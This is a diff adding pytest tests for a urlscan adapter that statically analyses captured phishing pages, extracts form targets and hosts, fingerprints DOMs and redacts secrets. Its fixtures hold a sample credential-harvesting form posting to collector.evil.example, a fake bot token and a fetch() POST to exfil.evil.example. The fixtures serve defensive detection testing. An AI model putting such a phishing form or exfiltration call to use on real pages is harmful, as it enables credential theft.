@@ -651,3 +651,149 @@ def test_configuration_and_policy_are_exposed_for_inspection() -> None:
     adapter = UrlscanAdapter(config=UrlscanConfig(timeout_seconds=11), lookup_policy=policy)
     assert adapter.config.timeout_seconds == 11
     assert adapter.lookup_policy is policy
+
+
+# --------------------------------------------------------------------------- #
+# Forensic extraction from what was captured
+# --------------------------------------------------------------------------- #
+
+KIT_DOM = UrlscanArtifact(
+    content=(
+        b"<html><title>Sign in</title>"
+        b'<form action="https://collector.evil.example/collect.php">'
+        b'<input type="password" name="passwd"></form>'
+        b'<script>var t = "123456789:AAFAKEfakeFAKEfakeFAKEfakeFAKEfake01";</script></html>'
+    ),
+    content_type="text/html",
+    truncated=False,
+)
+SCRIPT_BODY = UrlscanArtifact(
+    content=b'fetch("https://exfil.evil.example/drop", {method: "POST"})',
+    content_type="text/javascript",
+    truncated=False,
+)
+
+
+def forensic_adapter(
+    fake: FakeUrlscanClient, **policy: Any
+) -> tuple[UrlscanAdapter, InMemoryArtifactStore]:
+    store = InMemoryArtifactStore()
+    adapter, _ = make_adapter(
+        fake,
+        artifact_store=store,
+        lookup_policy=UrlscanLookupPolicy(**policy) if policy else None,
+    )
+    return adapter, store
+
+
+async def run_forensics(adapter: UrlscanAdapter) -> Any:
+    return await adapter.lookup(
+        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
+        credential(),
+    )
+
+
+async def test_a_captured_dom_is_statically_analysed() -> None:
+    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
+    envelope = await run_forensics(adapter)
+    findings = next(
+        item for item in envelope.evidence if item.claim_type == "urlscan_page_forensics"
+    )
+    assert findings.attributes["has_masked_input"] is True
+    assert "https://collector.evil.example/collect.php" in findings.attributes["form_actions"]
+    assert "telegram.bot-token" in findings.attributes["sensitive_identifier_types"]
+
+
+async def test_no_extracted_secret_reaches_the_envelope() -> None:
+    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
+    envelope = await run_forensics(adapter)
+    dumped = repr(envelope.model_dump(mode="json"))
+    assert "AAFAKEfake" not in dumped
+    assert "123456789:" not in dumped
+
+
+async def test_a_captured_dom_is_fingerprinted_for_pivoting() -> None:
+    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
+    envelope = await run_forensics(adapter)
+    fingerprints = next(
+        item for item in envelope.evidence if item.claim_type == "urlscan_page_fingerprints"
+    )
+    assert len(fingerprints.attributes["dom_structure"]) == 64
+    assert len(fingerprints.attributes["form_targets"]) == 64
+
+
+async def test_textual_response_bodies_are_retrieved_and_analysed() -> None:
+    digest = "a" * 64
+    payload = payloads.result_payload()
+    payload["data"]["requests"] = [
+        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}},
+        {"response": {"response": {"hash": "b" * 64, "mimeType": "image/png"}}},
+    ]
+    fake = FakeUrlscanClient(
+        result_payloads={payloads.SCAN_ID: payload}, response_bodies={digest: SCRIPT_BODY}
+    )
+    adapter, store = forensic_adapter(fake)
+    envelope = await run_forensics(adapter)
+    assert fake.call_count("response_body") == 1
+    body_findings = next(
+        item for item in envelope.evidence if item.claim_type == "urlscan_response_forensics"
+    )
+    assert body_findings.attributes["referenced_hosts"] == ["exfil.evil.example"]
+    kinds = {
+        artifact.kind
+        for artifact in store.list(ArtifactScope(user_id=USER, investigation_id=INVESTIGATION))
+    }
+    assert ArtifactKind.RESPONSE_BODY in kinds
+
+
+async def test_response_body_retrieval_respects_its_budget() -> None:
+    digests = [f"{index:064x}" for index in range(10)]
+    payload = payloads.result_payload()
+    payload["data"]["requests"] = [
+        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
+        for digest in digests
+    ]
+    fake = FakeUrlscanClient(
+        result_payloads={payloads.SCAN_ID: payload},
+        response_bodies=dict.fromkeys(digests, SCRIPT_BODY),
+    )
+    adapter, _ = forensic_adapter(fake, max_response_bodies=2)
+    await run_forensics(adapter)
+    assert fake.call_count("response_body") == 2
+
+
+async def test_response_bodies_can_be_switched_off_on_their_own() -> None:
+    digest = "a" * 64
+    payload = payloads.result_payload()
+    payload["data"]["requests"] = [
+        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
+    ]
+    fake = FakeUrlscanClient(
+        result_payloads={payloads.SCAN_ID: payload}, response_bodies={digest: SCRIPT_BODY}
+    )
+    adapter, _ = forensic_adapter(
+        fake, forensic_artifacts=frozenset({ArtifactKind.DOM, ArtifactKind.SCREENSHOT})
+    )
+    await run_forensics(adapter)
+    assert not fake.called("response_body")
+
+
+async def test_a_body_urlscan_no_longer_holds_is_skipped() -> None:
+    digest = "a" * 64
+    payload = payloads.result_payload()
+    payload["data"]["requests"] = [
+        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
+    ]
+    fake = FakeUrlscanClient(result_payloads={payloads.SCAN_ID: payload}, dom=KIT_DOM)
+    adapter, _ = forensic_adapter(fake)
+    envelope = await run_forensics(adapter)
+    assert fake.called("response_body")
+    assert not any(item.claim_type == "urlscan_response_forensics" for item in envelope.evidence)
+
+
+async def test_a_screenshot_is_stored_but_never_parsed() -> None:
+    """There is nothing this system would trust itself to extract from pixels."""
+    adapter, _ = forensic_adapter(FakeUrlscanClient(screenshot=PNG))
+    envelope = await run_forensics(adapter)
+    assert any(item.claim_type == "urlscan_stored_artifact" for item in envelope.evidence)
+    assert not any(item.claim_type == "urlscan_page_forensics" for item in envelope.evidence)
